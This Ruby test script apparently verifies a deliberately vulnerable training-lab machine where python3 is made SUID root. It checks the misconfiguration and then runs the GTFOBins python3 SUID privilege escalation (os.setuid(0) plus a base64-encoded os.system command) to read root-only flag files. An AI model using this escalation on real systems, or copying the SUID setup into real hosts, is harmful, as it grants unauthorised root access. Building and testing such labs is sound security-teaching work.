require_relative '../../../../../lib/post_provision_test'


class SUIDRootPython3Test < PostProvisionTest
  def initialize
    self.module_name = 'suid_root_python3'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # read_facts: strings_to_leak and leaked_filenames. Both are checked below
  # through json_inputs, so the test holds for any parameterised deployment.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    # /usr/bin/python3 is a symlink; the bit must be on the versioned binary.
    real = '$(readlink -f /usr/bin/python3)'

    tier(1) do
      test_local_command('python3 resolves to a versioned binary', 'readlink -f /usr/bin/python3', '/usr/bin/python3.')
      test_local_command('real python3 binary is SUID 4755 owned by root', "stat -c '%a %U' #{real}", '4755 root')
      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    # Tier 2: what a student sees as an unprivileged user.
    tier(2) do
      user = 'nobody'
      test_local_command('student can find the SUID python3 binary',
                         'find /usr/bin -maxdepth 1 -name "python3*" -perm -4000 2>/dev/null', '/usr/bin/python3.', user: user)
      test_local_command('python3 runs as an unprivileged user',
                         %q{python3 -c 'import os; print("uid", os.getuid(), "euid", os.geteuid())'}, 'euid 0', user: user)
      strings.each_with_index do |str, i|
        next if str.strip.empty?
        f = leaked[i] || leaked.first
        next unless f
        test_local_command("SUID python3 reads root-only #{f} as an unprivileged user",
                           %Q{python3 -c 'print(open("/root/#{f}").read())'}, str.strip.lines.first.to_s.strip, user: user)
      end
      leaked.each do |f|
        test_local_command("control: unprivileged user cannot read /root/#{f}",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1", 'Permission denied', user: user)
      end
    end

    # Tier 3: a genuine local privilege escalation. A disposable unprivileged
    # account (with_throwaway_ssh_user, removed afterwards) runs the GTFOBins
    # python3 SUID technique: because the binary is SUID root its euid is already
    # 0, so os.setuid(0) gives a real root uid, and os.system then runs a command
    # as root. Proof is the sentinel the root command drops on the target, read
    # back over the guest agent; record_rce_outcome asserts <privilege>=root_rwx
    # (uid 0). The same command also reads the root-only flag, shown separately.
    tier(3) do
      flag = leaked.first
      flag_string = strings.map(&:strip).find { |s| !s.empty? }
      with_throwaway_ssh_user do |user, _pass|
        collect = 'echo secgen_sudo_begin; sudo -n -l 2>/dev/null; echo secgen_sudo_end'
        collect += "; echo secgen_flag_begin; cat #{Shellwords.escape("/root/#{flag}")}; echo secgen_flag_end" if flag
        sentinel, root_cmd = build_sentinel(collect)
        # base64 keeps the root command (with ; > { } and quotes) safe through the
        # python -c single quotes and the login shell that runs the payload.
        b64 = Base64.strict_encode64(root_cmd)
        exploit = %Q{python3 -c 'import os,base64; os.setuid(0); os.system(base64.b64decode("#{b64}").decode())'}
        run_as_user(user, exploit)
        body = read_sentinel(sentinel)
        record_rce_outcome('python3 SUID privilege escalation to root', body, sentinel,
                           "GTFOBins python3 SUID escalation: unprivileged #{user} ran a command as root", 'root_rwx', 3)
        if flag && flag_string
          want = flag_string.lines.first.to_s.strip
          name = "escalated root reads the root-only /root/#{flag}"
          if !want.empty? && body.include?(want)
            pass_check(name, "root shell read leaked string #{want.inspect} from /root/#{flag}", tier: 3)
          else
            fail_check(name, "leaked string #{want.inspect} not found in the sentinel the root shell wrote; body: #{body[0, 300].inspect}", tier: 3)
          end
        end
        run_vagrant_ssh("rm -f #{Shellwords.escape(sentinel)}", timeout: 30)
      end
    end
  end

end

SUIDRootPython3Test.new.run
